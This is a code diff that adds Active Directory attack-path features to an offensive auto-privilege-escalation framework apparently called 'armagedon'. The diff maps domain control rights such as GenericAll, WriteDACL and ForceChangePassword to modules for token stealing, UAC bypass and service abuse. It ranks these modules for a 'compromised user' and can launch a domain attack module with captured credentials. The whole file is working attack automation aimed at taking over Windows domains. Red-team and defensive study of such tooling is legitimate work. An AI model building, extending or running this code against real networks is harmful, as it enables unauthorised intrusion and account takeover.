@@ -5,6 +5,7 @@ Discovers current privilege level, selects optimal privesc modules
 verifies escalation after each attempt.
 
 v2: Auto privilege detection, post-exploit verification, BloodHound integration.
+v3: DomainIntel integration — use outbound object control for path-driven attacks.
 """
 
 import importlib
@@ -189,6 +190,23 @@ BH_PATH_TO_MODULE = {
 }
 
 
+# Maps DomainIntel control types to privesc modules.
+DOMAIN_CONTROL_TO_MODULE = {
+    "ForceChangePassword":  ["stored_creds"],
+    "GenericAll":           ["stored_creds", "service_privesc"],
+    "AddMember":            ["stored_creds"],
+    "AllExtendedRights":    ["stored_creds"],
+    "AddKeyCredentialLink": ["token_steal"],
+    "AdminTo":              ["uac_bypass", "service_privesc"],
+    "WriteDACL":            ["service_privesc"],
+    "WriteOwner":           ["service_privesc"],
+    "HasSession":           ["token_steal"],
+    "CanRDP":               ["uac_bypass"],
+    "CanPSRemote":          ["uac_bypass"],
+    "ExecuteDCOM":          ["token_steal"],
+}
+
+
 def rank_modules_by_bloodhound(
     attack_paths: list,
     current_priv: str,
@@ -256,6 +274,62 @@ def rank_modules_by_privilege(current_priv: str) -> List[Tuple[str, dict, str]]:
             ranked.append((mod_id, meta, f"meets requirement: {req_priv}"))
 
     ranked.sort(key=lambda x: risk_order.get(x[1]["risk"], 99))
+    return ranked
+
+
+def rank_modules_by_domain_intel(
+    controls: list,
+    current_priv: str,
+) -> List[Tuple[str, dict, str]]:
+    """Rank privesc modules based on DomainIntel outbound object controls.
+
+    Args:
+        controls: List of ObjectControl objects from DomainIntel.get_outbound_control()
+        current_priv: Current privilege level ("user"/"admin"/"system")
+
+    Returns:
+        Sorted list of (module_id, module_meta, reason).
+    """
+    module_score: Dict[str, int] = {}
+    module_reasons: Dict[str, str] = {}
+
+    for ctrl in controls:
+        right_name = getattr(ctrl, "right_name", "")
+        target_name = getattr(ctrl, "target_name", "")
+        chain_value = getattr(ctrl, "chain_value", 1)
+        attack_info = getattr(ctrl, "attack_info", {})
+
+        severity = attack_info.get("severity", "info")
+        sev_score = {"critical": 4, "high": 3, "medium": 2, "info": 1}.get(severity, 1)
+
+        for mod_id in DOMAIN_CONTROL_TO_MODULE.get(right_name, []):
+            module_score[mod_id] = module_score.get(mod_id, 0) + sev_score * chain_value
+            reason = f"DomainIntel: {right_name} -> {target_name}"
+            if mod_id not in module_reasons:
+                module_reasons[mod_id] = reason
+            else:
+                module_reasons[mod_id] += f" | {reason}"
+
+    # Add modules compatible with current privilege
+    for mod_id, meta in PRIVESC_MODULES.items():
+        req_priv = meta["requirements"][0] if meta["requirements"] else "user"
+        if PRIV_INDEX.get(current_priv, 0) >= PRIV_INDEX.get(req_priv, 0):
+            if mod_id not in module_score:
+                module_score[mod_id] = 0
+                module_reasons[mod_id] = "compatible with current privilege"
+
+    risk_order = {"low": 0, "medium": 1, "high": 2}
+    ranked = []
+    for mod_id, score in module_score.items():
+        meta = PRIVESC_MODULES[mod_id]
+        ranked.append((mod_id, meta, module_reasons.get(mod_id, "")))
+
+    ranked.sort(
+        key=lambda x: (
+            -module_score.get(x[0], 0),
+            risk_order.get(x[1]["risk"], 99),
+        )
+    )
     return ranked
 
 
@@ -593,4 +667,122 @@ class AutoPrivesc:
                 for p in paths
             ],
             "escalation": escalation,
+        }
+
+    # ── DomainIntel-Driven Full Chain ───────────────────────────────────
+
+    def domain_intel_auto_escalate(
+        self,
+        domain_intel,
+        compromised_user: str = "",
+        target_user: str = "",
+        **creds,
+    ) -> dict:
+        """Domain Intel → attack recommendation → execute.
+
+        Flow:
+          1. Load DomainIntel (pre-ingested with ldapdomaindump/BH JSON)
+          2. Find outbound object control for compromised user
+          3. Rank targets by escalation value
+          4. Recommend and optionally execute best attack
+
+        Args:
+            domain_intel: DomainIntel instance (already loaded with data).
+            compromised_user: User we have creds for.
+            target_user: Specific target (empty = auto-select best).
+            **creds: user, passwd, domain for attack execution.
+
+        Returns:
+            dict with control analysis + recommended attacks + execution results.
+        """
+        from armagedon.core.domain_intel import DomainIntel
+
+        console.print(Panel(
+            "[bold magenta]DOMAIN INTEL → ATTACK CHAIN[/]",
+            border_style="magenta",
+        ))
+
+        if not domain_intel.summary().get("total_objects"):
+            console.print("[red]No domain data loaded in DomainIntel[/]")
+            return {"status": "no_data", "controls": [], "execution": None}
+
+        if not compromised_user:
+            console.print("[red]No compromised user specified[/]")
+            return {"status": "no_user", "controls": [], "execution": None}
+
+        # 1. Show whoami
+        console.print(f"  [cyan]Compromised user: {compromised_user}[/]")
+        domain_intel.print_whoami(compromised_user)
+
+        # 2. Get outbound controls
+        controls = domain_intel.get_outbound_control(compromised_user)
+        if not controls:
+            console.print("  [yellow]No outbound object control found — no AD attacks available[/]")
+            return {"status": "no_controls", "controls": [], "execution": None}
+
+        # 3. If specific target, filter
+        if target_user:
+            controls = [c for c in controls if c.target_name.lower() == target_user.lower()]
+            if not controls:
+                console.print(f"  [yellow]No control found from {compromised_user} to {target_user}[/]")
+                return {"status": "no_control_to_target", "controls": [], "execution": None}
+
+        # 4. Show ranked targets
+        console.print(f"  [cyan]Found {len(controls)} control(s):[/]")
+        for i, c in enumerate(controls[:10], 1):
+            hv = " [HIGH VALUE]" if (domain_intel.objects.get(c.target_sid) and
+                                     domain_intel.objects[c.target_sid].is_high_value) else ""
+            print(f"    {i}. {c.target_name}{hv} — {c.right_name} "
+                  f"(severity={c.attack_info.get('severity', '?')})")
+
+        # 5. Rank modules by DomainIntel
+        current_priv = self._current_priv or "user"
+        ranked = rank_modules_by_domain_intel(controls, current_priv)
+
+        if ranked:
+            sel_table = Table(title="Module Selection (DomainIntel)")
+            sel_table.add_column("#", style="cyan")
+            sel_table.add_column("Module", style="yellow")
+            sel_table.add_column("Risk", style="red")
+            sel_table.add_column("Reason", style="dim")
+            for i, (mod_id, meta, reason) in enumerate(ranked, 1):
+                sel_table.add_row(str(i), mod_id, meta["risk"], reason[:60])
+            console.print(sel_table)
+
+        # 6. Show attack recommendation
+        rec = domain_intel.recommend_attack(compromised_user, target_user)
+        console.print(f"\n  [bold]Best attack:[/] {rec.get('right','?')} on {rec.get('target','?')}")
+        if "example_commands" in rec:
+            console.print("  [dim]Example commands:[/]")
+            for cmd in rec["example_commands"]:
+                console.print(f"    {cmd}")
+
+        # 7. Optionally execute via domain_attack module
+        execution = None
+        if creds.get("user") and creds.get("passwd") and creds.get("domain"):
+            from armagedon.modules.auxiliary import domain_attack as da_mod
+            dc_ip = self.target or ""
+            opts = {
+                "DC_IP": dc_ip,
+                "DOMAIN": creds.get("domain", ""),
+                "USERNAME": creds.get("user", ""),
+                "PASSWORD": creds.get("passwd", ""),
+                "TARGET_USER": target_user or "",
+                "MODE": "CHECK",
+            }
+            console.print("\n  [cyan]Running CHECK mode via DomainAttackExecutor...[/]")
+            result = da_mod.run(options=opts, mode="CHECK")
+            execution = result
+
+        return {
+            "status": "complete",
+            "compromised_user": compromised_user,
+            "controls": [
+                {"target": c.target_name, "right": c.right_name,
+                 "severity": c.attack_info.get("severity", "?"),
+                 "chain_value": c.chain_value}
+                for c in controls
+            ],
+            "recommendation": rec,
+            "execution": execution,
         }
